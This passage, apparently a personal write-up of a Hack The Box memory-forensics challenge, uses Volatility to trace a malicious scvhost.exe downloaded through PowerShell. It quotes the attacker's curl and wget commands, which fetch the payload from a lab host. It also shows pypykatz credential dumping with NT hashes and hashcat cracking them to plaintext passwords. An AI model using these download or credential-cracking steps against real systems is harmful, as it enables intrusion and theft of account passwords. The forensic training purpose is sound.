6408    796     MicrosoftEdge.  0xc40aa6d350c0  0       -       1       False   2023-10-31 13:31:11.000000      2023-10-31 13:31:23.000000      Disabled
6756    620     svchost.exe     0xc40aa6f0e540  1       -       0       False   2023-10-31 13:31:11.000000      N/A     Disabled
7192    5156    SearchProtocol  0xc40aa70cc080  9       -       0       False   2023-10-31 13:31:13.000000      N/A     Disabled
7320    620     svchost.exe     0xc40aa715e340  5       -       0       False   2023-10-31 13:31:13.000000      N/A     Disabled
7616    2920    GoogleCrashHan  0xc40aa636e080  3       -       0       True    2023-10-31 13:31:15.000000      N/A     Disabled
7624    2920    GoogleCrashHan  0xc40aa63f5080  3       -       0       False   2023-10-31 13:31:15.000000      N/A     Disabled
8140    620     svchost.exe     0xc40aa51b4080  5       -       0       False   2023-10-31 13:31:20.000000      N/A     Disabled
5844    620     SecurityHealth  0xc40aa6b85080  13      -       0       False   2023-10-31 13:31:23.000000      N/A     Disabled
4100    620     svchost.exe     0xc40aa694d080  1       -       0       False   2023-10-31 13:32:21.000000      N/A     Disabled
3392    3308    csrss.exe       0xc40aa4969080  11      -       3       False   2023-10-31 13:32:28.000000      N/A     Disabled
3800    3308    winlogon.exe    0xc40aa6541080  3       -       3       False   2023-10-31 13:32:28.000000      N/A     Disabled
5996    3800    fontdrvhost.ex  0xc40aa63ad080  5       -       3       False   2023-10-31 13:32:29.000000      N/A     Disabled
548     3800    dwm.exe 0xc40aa5a8b080  13      -       3       False   2023-10-31 13:32:29.000000      N/A     Disabled
2768    1404    sihost.exe      0xc40aa5b2e080  8       -       3       False   2023-10-31 13:32:32.000000      N/A     Disabled
3280    620     svchost.exe     0xc40aa6aee080  3       -       3       False   2023-10-31 13:32:32.000000      N/A     Disabled
5516    620     svchost.exe     0xc40aa5a8f080  2       -       3       False   2023-10-31 13:32:32.000000      N/A     Disabled
2848    1208    taskhostw.exe   0xc40aa6195080  6       -       3       False   2023-10-31 13:32:32.000000      N/A     Disabled
7716    3800    userinit.exe    0xc40aa71eb080  0       -       3       False   2023-10-31 13:32:32.000000      2023-10-31 13:32:56.000000      Disabled
7944    7716    explorer.exe    0xc40aa64f4080  52      -       3       False   2023-10-31 13:32:32.000000      N/A     Disabled
7224    620     svchost.exe     0xc40aa64bc080  3       -       3       False   2023-10-31 13:32:33.000000      N/A     Disabled
760     796     ShellExperienc  0xc40aa63b4080  29      -       3       False   2023-10-31 13:32:33.000000      N/A     Disabled
532     796     SearchUI.exe    0xc40aa5a24080  26      -       3       False   2023-10-31 13:32:34.000000      N/A     Disabled
6268    796     RuntimeBroker.  0xc40aa715b540  2       -       3       False   2023-10-31 13:32:34.000000      N/A     Disabled
7572    796     MicrosoftEdge.  0xc40aa6e712c0  35      -       3       False   2023-10-31 13:32:34.000000      N/A     Disabled
784     796     ApplicationFra  0xc40aa40dd080  3       -       3       False   2023-10-31 13:32:34.000000      N/A     Disabled
488     796     Skype4Life.exe  0xc40aa5c6c080  14      -       3       False   2023-10-31 13:32:34.000000      N/A     Disabled
508     796     SkypeHelper.ex  0xc40aa10e3080  4       -       3       False   2023-10-31 13:32:34.000000      N/A     Disabled
2796    796     YourPhone.exe   0xc40aa64b14c0  16      -       3       False   2023-10-31 13:32:34.000000      N/A     Disabled
2660    796     browser_broker  0xc40aa6ae7500  4       -       3       False   2023-10-31 13:32:34.000000      N/A     Disabled
1616    796     RuntimeBroker.  0xc40aa6abe500  1       -       3       False   2023-10-31 13:32:34.000000      N/A     Disabled
2740    1616    MicrosoftEdgeS  0xc40aa71f3080  9       -       3       False   2023-10-31 13:32:35.000000      N/A     Disabled
6480    796     MicrosoftEdgeC  0xc40aa4981080  15      -       3       False   2023-10-31 13:32:35.000000      N/A     Disabled
5928    1468    TabTip.exe      0xc40aa694c540  5       -       3       False   2023-10-31 13:32:35.000000      N/A     Disabled
5588    796     RuntimeBroker.  0xc40aa4bc3080  3       -       3       False   2023-10-31 13:32:37.000000      N/A     Disabled
844     796     backgroundTask  0xc40aa6f99080  0       -       3       False   2023-10-31 13:32:40.000000      2023-10-31 13:34:57.000000      Disabled
8036    796     RuntimeBroker.  0xc40aa6dc1080  1       -       3       False   2023-10-31 13:32:44.000000      N/A     Disabled
6956    796     smartscreen.ex  0xc40aa5a5b300  6       -       3       False   2023-10-31 13:32:45.000000      N/A     Disabled
3536    7944    SecurityHealth  0xc40aa4ba23c0  1       -       3       False   2023-10-31 13:32:45.000000      N/A     Disabled
7516    796     SystemSettings  0xc40aa6e5d400  17      -       3       False   2023-10-31 13:32:45.000000      N/A     Disabled
6028    7944    vm3dservice.ex  0xc40aa6f7e500  1       -       3       False   2023-10-31 13:32:46.000000      N/A     Disabled
4596    7944    vmtoolsd.exe    0xc40aa69b73c0  6       -       3       False   2023-10-31 13:32:46.000000      N/A     Disabled
5712    7944    chrome.exe      0xc40aa6fca080  0       -       3       False   2023-10-31 13:32:50.000000      2023-10-31 13:33:04.000000      Disabled
8444    620     svchost.exe     0xc40aa6647080  11      -       0       False   2023-10-31 13:32:59.000000      N/A     Disabled
8536    620     svchost.exe     0xc40aa76a3080  1       -       0       False   2023-10-31 13:32:59.000000      N/A     Disabled
8744    620     SgrmBroker.exe  0xc40aa7a1a080  5       -       0       False   2023-10-31 13:33:00.000000      N/A     Disabled
8772    620     svchost.exe     0xc40aa7a15080  6       -       0       False   2023-10-31 13:33:00.000000      N/A     Disabled
8820    620     svchost.exe     0xc40aa6fc13c0  6       -       0       False   2023-10-31 13:33:00.000000      N/A     Disabled
9036    620     svchost.exe     0xc40aa7a21300  1       -       3       False   2023-10-31 13:33:00.000000      N/A     Disabled
8352    796     RuntimeBroker.  0xc40aa7a1c2c0  4       -       3       False   2023-10-31 13:33:05.000000      N/A     Disabled
1076    796     dllhost.exe     0xc40aa6d36080  5       -       3       False   2023-10-31 13:33:06.000000      N/A     Disabled
8860    620     svchost.exe     0xc40aa65c3080  0       -       0       False   2023-10-31 13:33:58.000000      2023-10-31 13:34:03.000000      Disabled
8416    3800    LogonUI.exe     0xc40aa0ee8080  5       -       3       False   2023-10-31 13:35:09.000000      N/A     Disabled
7884    7812    csrss.exe       0xc40aa7a1d080  13      -       4       False   2023-10-31 13:35:09.000000      N/A     Disabled
588     796     Microsoft.Phot  0xc40aa0eaa080  15      -       3       False   2023-10-31 13:35:09.000000      N/A     Disabled
1020    7812    winlogon.exe    0xc40aa768b080  5       -       4       False   2023-10-31 13:35:09.000000      N/A     Disabled
1792    1020    fontdrvhost.ex  0xc40aa63ce080  5       -       4       False   2023-10-31 13:35:09.000000      N/A     Disabled
6680    1020    dwm.exe 0xc40aa5ea5080  14      -       4       False   2023-10-31 13:35:09.000000      N/A     Disabled
9044    796     RuntimeBroker.  0xc40aa7a1e080  1       -       3       False   2023-10-31 13:35:10.000000      N/A     Disabled
4060    796     RuntimeBroker.  0xc40aa6107080  2       -       3       False   2023-10-31 13:35:11.000000      N/A     Disabled
6824    1404    sihost.exe      0xc40aa4d76080  10      -       4       False   2023-10-31 13:35:12.000000      N/A     Disabled
6432    620     svchost.exe     0xc40aa5eeb080  8       -       4       False   2023-10-31 13:35:12.000000      N/A     Disabled
6788    620     svchost.exe     0xc40aa4f8d080  4       -       4       False   2023-10-31 13:35:12.000000      N/A     Disabled
2104    1208    taskhostw.exe   0xc40aa69ab400  7       -       4       False   2023-10-31 13:35:12.000000      N/A     Disabled
6172    1468    ctfmon.exe      0xc40aa4fc5080  8       -       4       False   2023-10-31 13:35:12.000000      N/A     Disabled
5420    1468    TabTip.exe      0xc40aa5a8c2c0  9       -       4       False   2023-10-31 13:35:12.000000      N/A     Disabled
8788    1020    userinit.exe    0xc40aa73c2440  0       -       4       False   2023-10-31 13:35:12.000000      2023-10-31 13:35:36.000000      Disabled
1424    8788    explorer.exe    0xc40aa8c11440  87      -       4       False   2023-10-31 13:35:12.000000      N/A     Disabled
404     620     svchost.exe     0xc40aa8c69400  6       -       4       False   2023-10-31 13:35:13.000000      N/A     Disabled
7100    796     ShellExperienc  0xc40aa8cca0c0  26      -       4       False   2023-10-31 13:35:13.000000      N/A     Disabled
7448    796     SearchUI.exe    0xc40aa76c0080  46      -       4       False   2023-10-31 13:35:13.000000      N/A     Disabled
3244    796     RuntimeBroker.  0xc40aa8ca53c0  7       -       4       False   2023-10-31 13:35:14.000000      N/A     Disabled
6136    796     YourPhone.exe   0xc40aa82e0080  15      -       4       False   2023-10-31 13:35:14.000000      N/A     Disabled
2324    796     SkypeHelper.ex  0xc40aa4ef1080  4       -       4       False   2023-10-31 13:35:14.000000      N/A     Disabled
8368    796     Skype4Life.exe  0xc40aa69a9080  15      -       4       False   2023-10-31 13:35:14.000000      N/A     Disabled
7812    796     RuntimeBroker.  0xc40aa8cc3080  4       -       4       False   2023-10-31 13:35:15.000000      N/A     Disabled
7472    796     HxTsr.exe       0xc40aa8caa080  13      -       4       False   2023-10-31 13:35:20.000000      N/A     Disabled
2412    796     RuntimeBroker.  0xc40aa8cc7080  2       -       4       False   2023-10-31 13:35:20.000000      N/A     Disabled
112     796     RuntimeBroker.  0xc40aa8cc0080  1       -       4       False   2023-10-31 13:35:20.000000      N/A     Disabled
6932    796     RuntimeBroker.  0xc40aa8cbd080  1       -       4       False   2023-10-31 13:35:21.000000      N/A     Disabled
9064    620     svchost.exe     0xc40aa90b4080  6       -       4       False   2023-10-31 13:35:21.000000      N/A     Disabled
4664    796     smartscreen.ex  0xc40aa904d3c0  9       -       4       False   2023-10-31 13:35:24.000000      N/A     Disabled
5800    1424    SecurityHealth  0xc40aa9050080  1       -       4       False   2023-10-31 13:35:24.000000      N/A     Disabled
8644    1424    vm3dservice.ex  0xc40aa91f6400  1       -       4       False   2023-10-31 13:35:25.000000      N/A     Disabled
1736    1424    xampp-control.  0xc40aa92a7080  1       -       4       True    2023-10-31 13:35:28.000000      N/A     Disabled
8048    1424    chrome.exe      0xc40aa63ae080  40      -       4       False   2023-10-31 13:35:31.000000      N/A     Disabled
8728    8048    chrome.exe      0xc40aa71e8080  9       -       4       False   2023-10-31 13:35:31.000000      N/A     Disabled
7412    8048    chrome.exe      0xc40aa9290080  14      -       4       False   2023-10-31 13:35:31.000000      N/A     Disabled
5072    8048    chrome.exe      0xc40aa630e080  16      -       4       False   2023-10-31 13:35:31.000000      N/A     Disabled
5576    8048    chrome.exe      0xc40aa92a8080  10      -       4       False   2023-10-31 13:35:31.000000      N/A     Disabled
8124    8048    chrome.exe      0xc40aa6104080  15      -       4       False   2023-10-31 13:35:31.000000      N/A     Disabled
9352    796     HxOutlook.exe   0xc40aa93b3080  15      -       4       False   2023-10-31 13:35:32.000000      N/A     Disabled
9412    796     ApplicationFra  0xc40aa94ed400  7       -       4       False   2023-10-31 13:35:32.000000      N/A     Disabled
9420    796     MicrosoftEdge.  0xc40aa93b2080  22      -       4       False   2023-10-31 13:35:32.000000      N/A     Disabled
9572    796     browser_broker  0xc40aa9562400  6       -       4       False   2023-10-31 13:35:32.000000      N/A     Disabled
9580    796     RuntimeBroker.  0xc40aa94253c0  3       -       4       False   2023-10-31 13:35:32.000000      N/A     Disabled
10204   796     HxAccounts.exe  0xc40aa91dc4c0  14      -       4       False   2023-10-31 13:35:35.000000      N/A     Disabled
10212   9580    MicrosoftEdgeS  0xc40aa9188480  6       -       4       False   2023-10-31 13:35:35.000000      N/A     Disabled
9408    796     MicrosoftEdgeC  0xc40aa91df080  29      -       4       False   2023-10-31 13:35:35.000000      N/A     Disabled
10832   8048    chrome.exe      0xc40aa989f080  15      -       4       False   2023-10-31 13:35:45.000000      N/A     Disabled
10840   8048    chrome.exe      0xc40aa98c3080  15      -       4       False   2023-10-31 13:35:45.000000      N/A     Disabled
10600   8048    chrome.exe      0xc40aa76d9080  15      -       4       False   2023-10-31 13:35:49.000000      N/A     Disabled
10988   796     MicrosoftEdgeC  0xc40aa98f50c0  13      -       4       False   2023-10-31 13:35:50.000000      N/A     Disabled
7208    796     MicrosoftEdgeC  0xc40aa690d080  0       -       4       False   2023-10-31 13:36:08.000000      2023-10-31 13:36:18.000000      Disabled
11096   796     RuntimeBroker.  0xc40aa95fa280  7       -       4       False   2023-10-31 13:36:10.000000      N/A     Disabled
10336   796     MicrosoftEdgeC  0xc40aa9b96080  13      -       4       False   2023-10-31 13:36:19.000000      N/A     Disabled
376     796     WindowsInterna  0xc40aa541e080  33      -       4       False   2023-10-31 13:36:48.000000      N/A     Disabled
4912    1424    python.exe      0xc40aa770e080  1       -       4       False   2023-10-31 13:37:10.000000      N/A     Disabled
3028    4912    conhost.exe     0xc40aa64af080  3       -       4       False   2023-10-31 13:37:10.000000      N/A     Disabled
2896    4912    python.exe      0xc40aa9972080  4       -       4       False   2023-10-31 13:37:10.000000      N/A     Disabled
7368    8048    chrome.exe      0xc40aa98d0400  15      -       4       False   2023-10-31 13:37:17.000000      N/A     Disabled
11204   1736    httpd.exe       0xc40aa99c6080  1       -       4       False   2023-10-31 13:37:40.000000      N/A     Disabled
9128    11204   conhost.exe     0xc40aa4ee0080  3       -       4       False   2023-10-31 13:37:40.000000      N/A     Disabled
5212    1736    mysqld.exe      0xc40aa9898500  30      -       4       False   2023-10-31 13:37:41.000000      N/A     Disabled
9652    11204   httpd.exe       0xc40aa9cfe500  155     -       4       False   2023-10-31 13:37:41.000000      N/A     Disabled
11048   1736    FileZillaServe  0xc40aa989c500  5       -       4       True    2023-10-31 13:37:41.000000      N/A     Disabled
4276    1736    cmd.exe 0xc40aaa3cf080  1       -       4       False   2023-10-31 13:37:43.000000      N/A     Disabled
8568    4276    conhost.exe     0xc40aaa3ce080  3       -       4       False   2023-10-31 13:37:43.000000      N/A     Disabled
2696    4276    java.exe        0xc40aaa3d7080  35      -       4       False   2023-10-31 13:37:47.000000      N/A     Disabled
1272    796     dllhost.exe     0xc40aaa3d3080  9       -       4       False   2023-10-31 13:38:25.000000      N/A     Disabled
10048   1424    cmd.exe 0xc40aa956d540  1       -       4       False   2023-10-31 13:38:25.000000      N/A     Disabled
10040   10048   conhost.exe     0xc40aa95f6080  3       -       4       False   2023-10-31 13:38:25.000000      N/A     Disabled
9872    1736    FileZilla Serv  0xc40aa4fa2080  1       -       4       True    2023-10-31 13:39:07.000000      N/A     Disabled
9880    1736    FileZilla Serv  0xc40aa739e080  2       -       4       True    2023-10-31 13:41:02.000000      N/A     Disabled
8188    620     svchost.exe     0xc40aaa4d8100  4       -       0       False   2023-10-31 13:41:23.000000      N/A     Disabled
5708    8048    chrome.exe      0xc40aa5ea8080  9       -       4       False   2023-10-31 13:42:08.000000      N/A     Disabled
6772    1424    powershell.exe  0xc40aa9de7080  11      -       4       False   2023-10-31 13:42:21.000000      N/A     Disabled
4532    6772    conhost.exe     0xc40aaa8de4c0  3       -       4       False   2023-10-31 13:42:22.000000      N/A     Disabled
4964    8048    chrome.exe      0xc40aa6a08080  15      -       4       False   2023-10-31 13:44:11.000000      N/A     Disabled
5116    1424    mspaint.exe     0xc40aaa3f1080  7       -       4       False   2023-10-31 13:45:43.000000      N/A     Disabled
10100   620     svchost.exe     0xc40aa539a080  4       -       0       False   2023-10-31 13:45:43.000000      N/A     Disabled
11172   620     svchost.exe     0xc40aaa5d1080  1       -       0       False   2023-10-31 13:45:43.000000      N/A     Disabled
11156   6772    scvhost.exe     0xc40aa8cc8080  0       -       4       True    2023-10-31 13:50:20.000000      2023-10-31 13:51:36.000000      Disabled
1328    796     Microsoft.Phot  0xc40aaa3f2080  15      -       4       False   2023-10-31 13:54:21.000000      N/A     Disabled
4660    796     RuntimeBroker.  0xc40aa636a080  5       -       4       False   2023-10-31 13:54:21.000000      N/A     Disabled
6612    620     svchost.exe     0xc40aaaac3080  6       -       0       False   2023-10-31 13:55:22.000000      N/A     Disabled
9228    984     audiodg.exe     0xc40aa6f6a300  4       -       0       False   2023-10-31 13:56:08.000000      N/A     Disabled
7664    1468    TabTip.exe      0xc40aa73a4080  0       -       4       False   2023-10-31 13:56:11.000000      2023-10-31 13:56:14.000000      Disabled
7312    1424    FTK Imager.exe  0xc40aad8de080  9       -       4       True    2023-10-31 13:56:11.000000      N/A     Disabled
3120    796     dllhost.exe     0xc40aa51b2080  4       -       4       False   2023-10-31 13:57:17.000000      N/A     Disabled
4956    5156    SearchFilterHo  0xc40aa5a28080  8       -       0       False   2023-10-31 13:59:18.000000      N/A     Disabled
```

And correlated this data with previous finding's process IDs 3360, 11048, 9880 and 6772. And the I did a `pstree` on PID 6772. Even then I couldn't see the process ID.

```sh
$ vol3 -f memory_dump.vmem windows.pstree --pid 6772       
Volatility 3 Framework 2.7.1
Progress:  100.00               PDB scanning finished                        
PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime        Audit   Cmd     Path

472     384     wininit.exe     0xc40aa484e080  1       -       0       False   2023-10-31 13:30:56.000000      N/A     \Device\HarddiskVolume4\Windows\System32\wininit.exe    wininit.exe C:\Windows\system32\wininit.exe
* 620   472     services.exe    0xc40aa49a90c0  8       -       0       False   2023-10-31 13:30:56.000000      N/A     \Device\HarddiskVolume4\Windows\System32\services.exe   C:\Windows\system32\services.exe     C:\Windows\system32\services.exe
** 796  620     svchost.exe     0xc40aa50ad280  12      -       0       False   2023-10-31 13:30:57.000000      N/A     \Device\HarddiskVolume4\Windows\System32\svchost.exe    C:\Windows\system32\svchost.exe -k DcomLaunch -p     C:\Windows\system32\svchost.exe
*** 7812        796     RuntimeBroker.  0xc40aa8cc3080  4       -       4       False   2023-10-31 13:35:15.000000      N/A     \Device\HarddiskVolume4\Windows\System32\RuntimeBroker.exe  C:\Windows\System32\RuntimeBroker.exe -Embedding C:\Windows\System32\RuntimeBroker.exe
**** 1020       7812    winlogon.exe    0xc40aa768b080  5       -       4       False   2023-10-31 13:35:09.000000      N/A     \Device\HarddiskVolume4\Windows\System32\winlogon.exe   winlogon.exe C:\Windows\system32\winlogon.exe
***** 8788      1020    userinit.exe    0xc40aa73c2440  0       -       4       False   2023-10-31 13:35:12.000000      2023-10-31 13:35:36.000000      \Device\HarddiskVolume4\Windows\System32\userinit.exe        -       -
****** 1424     8788    explorer.exe    0xc40aa8c11440  87      -       4       False   2023-10-31 13:35:12.000000      N/A     \Device\HarddiskVolume4\Windows\explorer.exe    C:\Windows\Explorer.EXE      C:\Windows\Explorer.EXE
******* 6772    1424    powershell.exe  0xc40aa9de7080  11      -       4       False   2023-10-31 13:42:21.000000      N/A     \Device\HarddiskVolume4\Windows\System32\WindowsPowerShell\v1.0\powershell.exe       "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"     C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
******** 11156  6772    scvhost.exe     0xc40aa8cc8080  0       -       4       True    2023-10-31 13:50:20.000000      2023-10-31 13:51:36.000000      \Device\HarddiskVolume4\Users\BantingFG\Downloads\scvhost.exe        -       -
******** 4532   6772    conhost.exe     0xc40aaa8de4c0  3       -       4       False   2023-10-31 13:42:22.000000      N/A     \Device\HarddiskVolume4\Windows\System32\conhost.exe    \??\C:\Windows\system32\conhost.exe 0x4      C:\Windows\system32\conhost.exe
```

Now I found the process ID and process name. Please don't be stupid like me. Do a `pstree` and check for unusual/not-trusted-by-system directory for suspicious files. For example from a user's home directory like Downloads, Documents, etc. you get the gist. If followed till now you will have the answers for tasks up to 4.

For, task 5 I struggled heavily. I dumped all the `.evtx` file from the memory converted it to JSON and tried find the `4104` event for Powershell Script Block Text. What a disaster!

Dump all the file with the extension `.evtx`
```sh
$ vol3 -f memory_dump.vmem windows.dumpfiles --filter ".evtx$"
```

After that if you try convert them using EvtxECmd tool it won't play nice. So, I batch renamed them in Linux the `Thunar` like file explorer gives you nice options to do this. Then, I reran the evtx parser and compiled a single JSON file. Then I did a lot of jq kung-fu didn't find the command but I was able to uncover what kind of protocol it used, so that was helpful.

```sh
$ cat 20240621161500_EvtxECmd_Output.json | jq 'select(.EventId==4100)' | less
{
  "PayloadData1": "Severity = Warning",
  "PayloadData2": "Command Name: Invoke-WebRequest",
  "PayloadData3": "CommandType: Cmdlet",
  "PayloadData4": "Script Name: ",
  "PayloadData5": "HostApplication: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  "PayloadData6": "Host Name: ConsoleHost",
  "UserName": "DESKTOP-UMNCBE7\\BantingFG",
  "MapDescription": "Executing pipeline",
  "ChunkNumber": 3,
  "Computer": "DESKTOP-UMNCBE7",
  "Payload": "{\"EventData\":{\"Data\":[{\"@Name\":\"ContextInfo\",\"#text\":\"        Severity = Warning,         Host Name = ConsoleHost,         Host Version = 5.1.17763.316,         Host ID = 8fa103ce-0c44-43e0-ac8e-df87e2567d20,         Host Application = C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe,         Engine Version = 5.1.17763.316,         Runspace ID = 64229a85-901b-4b7a-9eab-fa74e87d4707,         Pipeline ID = 21,         Command Name = Invoke-WebRequest,         Command Type = Cmdlet,         Script Name = ,         Command Path = ,         Sequence Number = 15,         User = DESKTOP-UMNCBE7\\\\BantingFG,         Connected User = ,         Shell ID = Microsoft.PowerShell, \"},{\"@Name\":\"UserData\"},{\"@Name\":\"Payload\",\"#text\":\"Error Message = The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again. , Fully Qualified Error ID = WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand, \"}]}}",
  "UserId": "S-1-5-21-3466369480-1315555486-2413066615-1002",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "EventId": 4100,
  "EventRecordId": "42",
  "ProcessId": 6772,
  "ThreadId": 10680,
  "Level": "Warning",
  "Keywords": "0x0",
  "SourceFile": ".\\powershell_events\\file.0xc40aab362c20.0xc40aab0eada0.SharedCacheMap.Microsoft-Windows-PowerShell%4Operational.evtx.vacb.evtx.evtx",
  "ExtraDataOffset": 0,
  "HiddenRecord": false,
  "TimeCreated": "2023-10-31T13:43:12.1648343+00:00",
  "RecordNumber": 42
}
```

I searched for Invoke-WebRequest with the attacker IP couldn't found it until I dumped all the strings of the memdump and tried grep on "httx://192.168.157.151".

Running strings on the memdump:
```sh
$ strings memory_dump.vmem | grep "http://192.168.157.151"                                          
[33mhttp://192.168.157.151:8000/scvhost.exeee8000/scvhost.exenot
curl -o scvhost.exe http://192.168.157.151:8000/scvhost.exe
wget http://192.168.157.151:8000/scvhost.exe
curl http://192.168.157.151:8000/scvhost.exe
curl -L -o scvhost.exe http://192.168.157.151:8000/scvhost.exe
curl -o scvhost.exe http://192.168.157.151:8000/scvhost.exe
curl -o scvhost.exe http://192.168.157.151:8000/scvhost.exe
curl -o scvhost.exe http://192.168.157.151:8000/scvhost.exe
del .\scvhost.exexe http://192.168.157.151:8000/scvhost.exeexeMessageDetails } }mandErrorMessage") {
curl -o scvhost.exe http://192.168.157.151:8000/scvhost.exe
curl -o scvhost.exe http://192.168.157.151:8000/scvhost.exe
curl -L -o scvhost.exe http://192.168.157.151:8000/scvhost.exe
curl -L -o scvhost.exe http://192.168.157.151:8000/scvhost.exe
wget http://192.168.157.151:8000/scvhost.exe
curl http://192.168.157.151:8000/scvhost.exe
curl -L -o scvhost.exe http://192.168.157.151:8000/scvhost.exe
curl -o scvhost.exe http://192.168.157.151:8000/scvhost.exe
curl -o scvhost.exe http://192.168.157.151:8000/scvhost.exe
```

One of them is the command the attacker ran to download the malware.

At this point I saved the `strings` dump to a file. And began searching for `331 Password required for` which is the default authentication failure message for FileZilla and mostly many of the FTP server or at least 530 error code.
```text
(not logged in) (192.168.157.151)> 331 Password required for admin
(not logged in) (192.168.157.151)> 331 Password required for kalilinux123
(not logged in) (192.168.157.151)> 331 Password required for kali
```

For task 7 we can use a plugin called `chromehistoryviewer` and get all the Browser history with a timeline in a CSV file.
```sh
$ vol -f memory_dump.vmem --profile=Win10x64_17763 chromehistory --output=csv --output-file=history.csv
```

From there we can find the last visited URL by the TA.

To get the password of the affected user (At first I thought FTP user 😅), we can use a plugin called `pypykatz` it dumps the credentials from memory not just from registry hives, it does all.
```sh
$ vol3 -f memory_dump.vmem pypykatz                       
Volatility 3 Framework 2.7.1
ERROR    pypykatz    : Failed to prcess TSPKG package! Reason: Page Fault at entry 0x0 in table page directory

credtype        domainname      username        NThash  LMHash  SHAHash masterkey       masterkey(sha1) key_guid        password

msv     DESKTOP-UMNCBE7 Admin   3dbde697d71690a769204beb12283678                0d5399508427ce79556cda71918020c1e8d15b53
msv     DESKTOP-UMNCBE7 BantingFG       5a4a40e43197cd4dfb7c72e691536e92                7df220b7ed7bca82d3e170731b6cd86587101192
dpapi                                           e26a2d47a3e4a33400614daff0d5e6a061200de1abd4056b8b658b44e18f1d1f8101cc04c8e5315952edd9bf32ee44c05b0bc3d99053cf375ddec2414930b79a        d735c94c3064d338ef6e1a874780adfa4b4bfa41     21dfb24c-d9a1-4e46-bff2-ba98539b9768
msv     DESKTOP-UMNCBE7 Admin   3dbde697d71690a769204beb12283678                0d5399508427ce79556cda71918020c1e8d15b53
dpapi                                           34d138d82127c75b238d8f414e98b48358b3a8880f43e2212c3bb172c823fbf2424351ee8ddc9e407f3e46629a022f65c313005f7ac94d0f5c059aebcad0c125        3c950963ae990a1118b279d0bcfb3f11b743a49f     afc04938-bba9-4f5c-b9c3-e4b899cb27ee
dpapi                                           d55ecb922b0fd16d9af227c265059dc46192abfbf5c89339d1c5a432be47b963d1355bfbcaf9016956f9ac16b8f42c8b2d934b8c43fbb22d54f2292d593f3ecb        f37d82960fd5a4c3feaa398fae970f4cb33a24b6     a7683077-63ed-4595-9bf2-e8f9d3bc2f3a
msv     DESKTOP-UMNCBE7 Admin   3dbde697d71690a769204beb12283678                0d5399508427ce79556cda71918020c1e8d15b53
dpapi                                           3d15d26f3532f6ca7567cc69cfa3e82507edea1ab0fcb4d8dbe87cc15c309e08cb16bfe596004904241d93b1c2631401dd49d150e9f47bdcf5b0429be90bc5c9        1dd83beebdd1a4cf6e8ac19d13ad0d84add78596     ddcc14de-a060-4863-ad1d-96fb7b555c99
dpapi                                           784504bf11d0066d4663c9967856053b47980657e18b4909828c8d0d0f66d3a9866566446ead1eba2554413ce0ee591da2588270d12725a2a849960ffb226ab8        2f988aa590011bebf9dc9db3e18a053356e6fb16     9f5bd34d-3191-4b45-a5b7-68bc8336dbea
dpapi                                           2cf5018d1e054a01d4b908668e7082b6be4ce334d4d73b1eea67bd821010ee1638e56e2b57b45959e8ad5d4bc11c20e8d3dc8c883bc44a3ea631ff55a615dbdd        72ae3ff66d9014848ddac0c0aa1d01b1ee7d08f9     3918288f-2eb4-4d79-ba4a-d325164ebd87
dpapi                                           a479224d253b2e7d5b8f2e56f0a8c427e3c6edf4742540a61999759f290cf909c0baabd9027eddfcc660d4f52320c2a42c81affd652932b5968b3f98b1bb357f        09ff221cfa897a19b8065495501a4d61885518ed     e81493f9-1082-443b-8caf-e220f16e4ff5
dpapi                                           5df8b07e65ba2d80a81f93bbdc9fde08f203a0d00fc4999e999179e10616d716a954d6486408a11ec61ab3ad39af93a1e3a4d5652ad0251582f6878450f705a6        8d09e135aa13a8edbe3d94e0978c5c81ecd01071     8f367e09-0da5-4303-b810-8aef131b9b4c
```

Using the NT hash from the `BantingFG` I used hashcat to crack it. I mean I did it for the machines never for a Sherlock that was a first.

```sh
$ hashcat mellitus.hash ~/SecLists/Passwords/Leaked-Databases/rockyou.txt -m 1000 --show
3dbde697d71690a769204beb12283678:123
5a4a40e43197cd4dfb7c72e691536e92:flowers123
```

Task 8 and 9 looks more like CTF challenges. To find the answers I read this article on [CTFTime](https://ctftime.org/writeup/23198) and it gave me some hints.

First I dumped the `mspaint.exe`'s memory using `memdump` plugin.
```sh
$ vol -f memory_dump.vmem --profile=Win10x64_17763 memdump -p 5116 --dump-dir .           
Volatility Foundation Volatility Framework 2.6.1
************************************************************************
Writing mspaint.exe [  5116] to 5116.dmp
```

Then I renamed the `5116.dmp` to `5116.data` because of an Issue with gimp. Gimp does not load raw data without `.data` extension apparently.

Opening raw dump data with gimp
```sh
$ gimp 5116.data
```

I adjusted the height and width and most importantly the offset.
![alt text](images/20240623072546.png)

Before writing this writeup I found one in the yellow band. Now it is in Cyan band. Don't know what's happening here.

### Summary
It was tougher than other sherlocks I have solved. But, it was a medium difficulty rated on HTB. This sherlock introduces a little bit CTF-ish style. I enjoyed  it.